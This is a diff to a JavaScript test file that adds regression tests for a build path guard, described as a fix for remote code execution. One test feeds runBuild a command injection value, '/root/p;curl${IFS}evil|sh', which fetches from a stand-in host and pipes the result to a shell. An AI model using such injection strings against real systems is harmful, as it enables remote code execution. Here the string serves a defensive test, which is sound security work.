@@ -9,6 +9,7 @@ import {
 } from '../server/src/personas.js';
 import { _testInternals as ROUT } from '../server/src/routines.js';
 import { _testInternals as AUTH } from '../server/src/auth.js';
+import { runBuild } from '../server/src/build.js';
 
 let pass = 0, fail = 0;
 function test(name, fn) {
@@ -200,6 +201,19 @@ test('bearerOk rejects wrong length + wrong value', () => {
 test('a forged session token is invalid', () => {
   assert.equal(AUTH.sessionValid('f'.repeat(64)), false);
   assert.equal(AUTH.sessionValid(null), false);
+});
+
+// ── build path guard (RCE fix, 2026-07-22): the client-supplied build path
+// must be validated + passed as cwd, never interpolated into a shell string ──
+test('build guard — path outside PROJECTS_DIR is rejected (fails closed)', () => {
+  const msgs = [];
+  runBuild('/etc', (m) => msgs.push(m));
+  assert.ok(msgs.some((m) => m.t === 'build.err'), 'expected build.err for out-of-root path');
+});
+test('build guard — shell-metacharacter path is rejected (RCE attempt fails closed)', () => {
+  const msgs = [];
+  runBuild('/root/p;curl${IFS}evil|sh', (m) => msgs.push(m));
+  assert.ok(msgs.some((m) => m.t === 'build.err'), 'metachar path must be rejected, never spawned');
 });
 
 console.log(`\n${pass} passed, ${fail} failed`);
